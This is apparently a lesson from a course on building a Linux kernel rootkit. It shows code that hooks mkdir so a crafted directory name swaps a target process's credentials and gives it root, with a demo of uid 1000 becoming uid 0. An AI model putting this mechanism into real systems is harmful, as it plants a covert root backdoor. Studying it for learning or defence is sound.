# Escalate another process by PID

In L08 you escalated your own process. But a rootkit operator often needs to
grant root to a process that is already running: a shell on another terminal,
a script waiting for privileges, a daemon that should not have started as root.

This lesson extends your handler to accept `mkdir rklings.e.1234`, where 1234
is the target PID.

## Finding a task by PID

The kernel's process table is protected by RCU (Read-Copy-Update). To safely
look up a task:

```c
rcu_read_lock();
task = find_task_by_vpid(pid);
if (!task) {
    rcu_read_unlock();
    return -ESRCH;
}
// use task safely here
rcu_read_unlock();
```

`find_task_by_vpid()` looks up a task by its virtual PID (the PID visible in
the current PID namespace). The returned pointer is only valid while the RCU
read lock is held.

## Replacing another task's credentials

For your own process, `commit_creds()` handles everything. For another task,
you replace the credential pointers directly:

```c
old_cred = task->real_cred;
rcu_assign_pointer(task->real_cred, new_cred);
rcu_assign_pointer(task->cred, new_cred);
```

Then release the old credentials with `put_cred(old_cred)`.

Filter out kernel threads (tasks without `->mm`) since they should not receive
userspace credentials.

## Parsing the PID

Your handler receives the full basename. For `mkdir rklings.e.1234`:

```c
// name = "rklings.e.1234"
// Check "rklings.e." prefix (10 chars)
// suffix = name + 10 = "1234"
// kstrtoint(suffix, 10, &pid)
```

`kstrtoint()` is the kernel's safe string-to-integer parser. It rejects
trailing garbage and overflow.

## Your task

Extend your L08 handler in `main.c`:

1. Keep `rk_escalate()` for self-escalation (`mkdir rklings.e`)
2. Add `rk_escalate_pid(int pid)` that escalates a target task
3. Update `RK_ON_MKDIR` to parse "rklings.e.PID"

## Verify

Terminal 1 (target):
```sh
$ echo $$
1234
$ id
uid=1000(user)
```

Terminal 2 (operator):
```sh
$ mkdir rklings.e.1234
```

Terminal 1:
```sh
$ id
uid=0(root)
```
